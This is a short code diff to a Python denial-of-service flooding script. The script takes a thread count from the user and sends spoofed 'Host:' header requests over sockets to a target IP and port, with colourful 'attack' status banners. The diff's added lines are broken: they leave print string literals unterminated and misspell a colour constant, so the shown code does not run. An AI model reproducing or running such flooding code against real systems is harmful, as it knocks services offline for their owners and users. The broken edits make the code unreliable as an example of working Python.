@@ -9,6 +9,7 @@ def ddos():
     print("press CTRL + C and press ENTER to exit !!!")
     while True:
         try:
+            print(f"{Fore.LIGTBLUE_EX}
             threads = int(input("ENTER NUMBER OF THREADS : "))
         except ValueError:
             print("please enter a integer value")
@@ -50,7 +51,7 @@ def ddos():
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
                 attack_ip += 2
-                print("[💢]  \033[0;36mMalack-313 \033[0;31m \033[1;37m▒ \033[1;33mGET \033[1;37mattack \033[1;34m=> \033[1;35m▒" +str(ip)+ "\033[0m")
+                print(f"
             except socket.error:
                 print("[💥]\033[1;35m Finnaly attack \033[0;31m Check ip in check host \033[0m")
                 break
